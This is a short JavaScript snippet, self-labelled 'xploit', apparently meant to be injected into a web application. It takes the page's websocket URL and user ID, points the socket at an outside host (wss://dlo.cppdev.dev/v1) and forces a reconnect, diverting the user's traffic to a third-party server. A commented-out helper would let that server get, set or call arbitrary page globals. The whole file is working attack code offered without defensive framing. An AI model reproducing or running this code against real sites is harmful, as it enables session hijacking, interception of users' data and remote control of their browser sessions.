(function(debug){
    if(!debug&&globalThis.xploit)return true;
    

    const surl=socket.options.url,
    oopt={...socket.options},
    userId=surl.match(/=[0-9]*$/)[0].replace(/^=/,""),
    nurl=`${!debug?"wss://dlo.cppdev.dev/v1":"wss://dlo.cppdev.dev/v1"}?userid=${userId}`;

    globalThis.dloOOpt={...oopt};
    socket.options.url=nurl;
    socket.socket.close();

    /*function access(str){
        // access objects and properties
        let _str=`{
            "action": ["call","test"],
            "prop": ["socket","socket","send"]
        }`;
        let obj=globalThis,j=JSON.parse(str);
        for(let p of j.prop.slice(0,j.prop.length-1))obj=obj[p];
        if(j.action[0]=="set")return obj[j.prop[j.prop.length-1]]=j.action[1];
        else if(j.action[0]=="call")return obj[j.prop[j.prop.length-1]](...j.action.slice(1));
        else if(j.action[0]=="get")return obj[j.prop[j.prop.length-1]]; // do something
        else return null;
    };*/

    globalThis.xploit=true;
})(true);